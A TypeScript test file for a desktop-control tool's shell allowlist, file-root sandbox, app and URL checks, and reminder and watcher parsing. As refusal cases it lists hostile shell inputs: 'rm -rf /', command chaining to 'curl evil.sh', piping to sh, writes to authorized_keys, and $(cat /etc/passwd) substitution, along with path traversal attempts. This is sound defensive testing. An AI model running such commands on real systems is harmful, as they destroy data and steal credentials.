import assert from "node:assert/strict";
import path from "node:path";
import { describe, it } from "node:test";
import { appAllowed, isUrl, resolveInRoot, shellAllowed } from "./pc";
import { parseWatchSpec, parseWhenSec } from "./watchers";

// ── shell allowlist — the sharpest edge ─────────────────────────────────────
describe("shellAllowed — only exact allowlist entries, no chaining", () => {
  const allow = ["git status", "npm test", "echo hi"];

  it("allows an exact match or entry + args", () => {
    assert.equal(shellAllowed("git status", allow), true);
    assert.equal(shellAllowed("git status -s", allow), true);
    assert.equal(shellAllowed("npm test", allow), true);
  });

  it("REFUSES anything not on the allowlist", () => {
    assert.equal(shellAllowed("rm -rf /", allow), false);
    assert.equal(shellAllowed("gitstatus", allow), false); // not a word boundary
    assert.equal(shellAllowed("git", allow), false); // shorter than an entry
  });

  it("REFUSES chaining / redirect / subshell even when the prefix matches", () => {
    assert.equal(shellAllowed("git status && rm -rf /", allow), false);
    assert.equal(shellAllowed("git status; curl evil.sh", allow), false);
    assert.equal(shellAllowed("git status | sh", allow), false);
    assert.equal(shellAllowed("git status > ~/.ssh/authorized_keys", allow), false);
    assert.equal(shellAllowed("echo hi `whoami`", allow), false);
    assert.equal(shellAllowed("echo hi $(cat /etc/passwd)", allow), false);
  });

  it("refuses everything when the allowlist is empty", () => {
    assert.equal(shellAllowed("git status", []), false);
    assert.equal(shellAllowed("anything", []), false);
  });
});

// ── files root containment — no escaping the sandbox ────────────────────────
describe("resolveInRoot — every file op stays inside the root", () => {
  const root = process.platform === "win32" ? "C:\\Users\\me\\shared" : "/home/me/shared";

  it("resolves a normal relative path inside the root", () => {
    const r = resolveInRoot(root, "notes/todo.txt");
    assert.equal(r.ok, true);
    if (r.ok) assert.ok(r.abs.startsWith(path.resolve(root)));
  });

  it("resolves the root itself for an empty path", () => {
    const r = resolveInRoot(root, "");
    assert.equal(r.ok, true);
  });

  it("REFUSES ../ traversal", () => {
    assert.equal(resolveInRoot(root, "../secrets").ok, false);
    assert.equal(resolveInRoot(root, "a/b/../../../etc/passwd").ok, false);
  });

  it("REFUSES an absolute path outside the root", () => {
    const outside = process.platform === "win32" ? "C:\\Windows\\System32" : "/etc/passwd";
    assert.equal(resolveInRoot(root, outside).ok, false);
  });

  it("REFUSES everything when no root is configured", () => {
    assert.equal(resolveInRoot(undefined, "anything").ok, false);
    assert.equal(resolveInRoot("", "anything").ok, false);
  });
});

describe("appAllowed / isUrl", () => {
  it("app names match case-insensitively against the allowlist", () => {
    assert.equal(appAllowed("Spotify", ["spotify", "code"]), true);
    assert.equal(appAllowed("notepad", ["spotify"]), false);
    assert.equal(appAllowed("anything", []), false);
  });
  it("recognizes http(s) URLs", () => {
    assert.equal(isUrl("https://github.com"), true);
    assert.equal(isUrl("http://localhost:3100"), true);
    assert.equal(isUrl("spotify"), false);
    assert.equal(isUrl("file:///etc/passwd"), false);
  });
});

// ── reminder / watcher parsing ──────────────────────────────────────────────
describe("parseWhenSec", () => {
  it("parses s/m/h/d", () => {
    assert.equal(parseWhenSec("90s"), 90);
    assert.equal(parseWhenSec("20m"), 1200);
    assert.equal(parseWhenSec("2h"), 7200);
    assert.equal(parseWhenSec("1d"), 86400);
    assert.equal(parseWhenSec("in 30 min"), 1800);
  });
  it("rejects garbage and out-of-range", () => {
    assert.equal(parseWhenSec("soon"), null);
    assert.equal(parseWhenSec("0m"), null);
    assert.equal(parseWhenSec("400d"), null); // > ~1 month cap
  });
});

describe("parseWatchSpec", () => {
  it("parses cpu / file / proc", () => {
    assert.deepEqual(parseWatchSpec("cpu>80"), { kind: "cpu", threshold: 80 });
    assert.deepEqual(parseWatchSpec("cpu 90"), { kind: "cpu", threshold: 90 });
    assert.deepEqual(parseWatchSpec("file C:\\build.log"), { kind: "file", arg: "C:\\build.log" });
    assert.deepEqual(parseWatchSpec("proc chrome"), { kind: "proc", arg: "chrome" });
  });
  it("rejects nonsense and bad thresholds", () => {
    assert.equal(parseWatchSpec("cpu>200"), null);
    assert.equal(parseWatchSpec("whatever"), null);
  });
});
